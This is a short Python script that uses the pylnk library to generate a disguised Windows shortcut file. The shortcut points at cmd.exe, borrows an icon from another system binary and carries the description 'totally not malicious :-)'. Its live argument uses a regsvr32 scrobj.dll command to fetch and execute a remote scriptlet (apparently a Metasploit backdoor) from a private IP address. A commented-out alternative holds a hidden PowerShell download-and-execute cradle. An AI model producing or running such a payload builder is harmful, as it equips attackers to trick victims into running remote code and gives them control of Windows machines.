#!/usr/bin/python

import  pylnk

#http://ashishpython.blogspot.com/2014/09/create-shortcuts-using-python-for.html
#http://timgolden.me.uk/python/win32_how_do_i/create-a-shortcut.html
#http://grokbase.com/t/python/python-list/99bbfhk2r6/win32api-can-it-create-a-windows-shortcut-lnk-file
#https://sourceforge.net/p/pylnk/home/documentation/

def make_lnk (filename):
    link = pylnk.for_file("C:\\windows\\System32\cmd.exe")
    link.description = "totally not malicious :-)"
    link.relative_path = "C:\\Windows\\System32\\cmd.exe"
    #link.arguments = "/c calc.exe"
    link.arguments = "/c regsvr32 /s /n /u /i:http://10.0.0.14:8000/msfback2.sct scrobj.dll"
    #link.arguments = "/c powershell.exe -nop -w hidden -c $I=new-object net.webclient;$I.proxy=[Net.WebRequest]::GetSystemWebProxy();$I.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $I.downloadstring('http://10.0.0.14:8080/Jw6Z90Geb58zA8');"
    link.icon = "C:\\Windows\\System32\\cliconfg.exe"
    link.save(filename)
	
make_lnk("blah4.lnk")
